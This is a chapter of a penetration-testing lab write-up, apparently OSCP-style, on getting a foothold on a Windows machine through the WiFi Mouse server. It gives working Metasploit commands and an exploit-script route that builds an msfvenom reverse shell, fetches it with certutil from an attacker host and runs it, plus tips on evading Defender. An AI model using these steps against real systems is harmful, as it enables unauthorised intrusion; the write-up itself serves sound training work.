# 04 — Foothold

Goal: get a shell as the logged-on user, and know exactly what privileges it carries before touching
anything else.

---

## 4.1 Metasploit — `wifi_mouse_rce`

```
msfconsole -q
use exploit/windows/misc/wifi_mouse_rce
set RHOSTS 192.168.103.145
set LHOST 192.168.45.158
set PAYLOAD windows/shell/reverse_tcp
run
```

The session table afterwards:

```
sessions -l

Active sessions
===============

  Id  Name  Type                   Information            Connection
  --  ----  ----                   -----------            ----------
  11        shell x86/windows      Shell Banner: Microso  192.168.45.158:4444 -
                                   ft Windows [Version 1  > 192.168.103.145:509
                                   0.0.19041.1] -----     15 (192.168.103.145)
```

```
Microsoft Windows [Version 10.0.19041.1]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\MouseServer.exe>
```

Note the working directory: `C:\Program Files (x86)\`. The shell inherits the *service's*
context, and MouseServer runs from its install directory. That path is also a reminder of why the
foothold cannot escalate itself — see 4.5.

### Why these options

| Option | Value | Reason |
|---|---|---|
| `RPORT` | `1978` (default) | the protocol port |
| `PAYLOAD` | `windows/shell/reverse_tcp` | staged and small — every byte is *typed* on the remote desktop |
| `SLEEP` | `1` (default) | delay between typed chunks; raise to 2–3 on a slow VM |
| `LHOST` | tun0 address | `ifconfig tun0` — the lab VPN, not `eth0` |

The payload constraint is the whole trick. This module uses a **command stager**: it types
`certutil`/PowerShell lines that download a small stage, then executes it. A 200 KB Meterpreter
stager typed at ~40 characters per second with a desktop in the middle would drop characters. A
staged `shell/reverse_tcp` is the smallest thing that yields a usable session.

`ipconfig` on the Kali side if `LHOST` is ever wrong:

```bash
ip -4 addr show tun0 | grep inet
```

---

## 4.2 First actions — establish identity, not access

Before exploring:

```cmd
whoami
whoami /priv
whoami /groups
net localgroup administrators
```

The identity was already visible in Meterpreter:

```
meterpreter > getuid
Server username: OSCP\offsec
```

`OSCP\offsec` — a **local** account on machine `OSCP` (`MACHINE\user` means a local account, not a
domain one). `sysName` said `zachary`, but `sysName` is a free-text SNMP string somebody typed; the
real computer name is what Windows reports. **Trust the OS over the MIB.**

`zachary` was a lead — a possible account for a later credential guess — not the hostname. Keep both
facts; do not overwrite one with the other.

---

## 4.3 Upgrade to Meterpreter

```
sessions -u <id from sessions -l>
sessions -i <the new id it prints>
```

```
[*] Upgrading session ID: 13
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.45.158:4433
[*] Sending stage (232006 bytes) to 192.168.103.145
[*] Meterpreter session 14 opened (192.168.45.158:4433 -> 192.168.103.145:50949) at 2026-11-21 02:07:50 -0500
[*] Stopping exploit/multi/handler
```

Session ids drift as you upgrade and re-upgrade; always re-read `sessions -l` instead of assuming the
next number. Running `sessions -u 12` when only 11 and 13 existed produced
`[-] Invalid session identifier: 12` — harmless, but a good reminder that every `sessions`
sub-command takes the id from the table, not from your memory.

Meterpreter buys three things a raw `shell` does not: `upload`/`download` without SMB, `search -f`
across the filesystem, and `getsystem`. It costs a 232 KB stage over a typed stager — which worked
here, but is the first thing to suspect if the session dies mid-upgrade.

A plain `shell` is enough for everything in this box; the upgrade is for convenience.

---

## 4.4 The no-Metasploit route (EDB-50972)

Same primitive, useful when MSF is unavailable or the command stager is blocked:

```bash
searchsploit -m 50972
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.158 LPORT=443 -f exe -o s.exe
python3 -m http.server 80
nc -lvnp 443
```

In another pane:

```bash
python3 50972.py 192.168.103.145 192.168.45.158 s.exe
```

The script types, character by character with a 30 ms delay:

```
openfile /C/Windows/System32/cmd.exe
certutil.exe -urlcache -f http://192.168.45.158/s.exe C:\Windows\Temp\s.exe
C:\Windows\Temp\s.exe
```

Two practical notes from this box's image family:

- **`certutil` downloads work where reverse shells often do not.** Defender blocks the *execution*
  of stock payloads more reliably than it blocks the download. If the staged EXE never runs, try an
  in-memory loader instead of a file.
- **`nc.exe` fetched but would not execute** on the sibling build of this image. Do not plan around
  a bare `nc`.

The bash variant (EDB-51016) does the same with `socat`, and includes a `fileexplorer` mode that
dumps directory listings over the same socket — handy for reading files when you cannot yet run
commands:

```bash
echo 'fileexplorer ~/' | nc 192.168.103.145 1978 | strings
```

---

## 4.5 What the foothold gives you, precisely

| You have | You do not have |
|---|---|
| Code execution as `offsec` | Administrator or SYSTEM |
| A desktop that accepts keystrokes | `SeImpersonatePrivilege` |
| Read access to `C:\Users\offsec` | Read access to other profiles |
| `certutil`, PowerShell, `cmd` | A patch level you can trust |

Check the last row properly in the next chapter. Build 19041 tells you the release, not the hotfix
state, and the difference decides which local exploit works.

---

## 4.6 Cleanup note

The command stager leaves a stage on disk (`C:\Windows\Temp\…` or the user's `%TEMP%`) and opens a
console window on the remote desktop that stays visible until the session ends. On a real engagement
that window is the loudest thing you will do all day — note it in the report, and remove the stage
before you leave.
